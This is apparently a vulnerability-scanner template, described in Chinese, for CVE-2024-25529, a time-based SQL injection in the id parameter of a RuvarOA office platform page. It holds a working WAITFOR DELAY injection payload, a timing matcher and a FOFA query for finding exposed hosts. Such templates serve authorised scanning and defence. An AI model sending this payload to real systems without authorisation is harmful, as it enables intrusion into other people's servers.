id: CVE-2024-25529-RuvarOA-SQLi

info:
  name: RuvarOA协同办公平台SQL注入漏洞
  author: Simple
  severity: high
  description: |
    RuvarOA v6.01 和 v12.01 被发现通过 /WorkFlow/wf_office_file_history_show.aspx 中的 id 参数包含 SQL 注入漏洞。
  reference:
    - https://github.com/JJThome
  metadata:
    fofa-query: body="txt_admin_key"

http:
  - method: GET
    path:
      - "{{BaseURL}}/WorkFlow/wf_office_file_history_show.aspx?id=1%27WAITFOR%20DELAY%20%270:0:5%27--"

    matchers:
      - type: dsl
        dsl:
          - 'duration>=5'
          - 'status_code == 200'
        condition: and
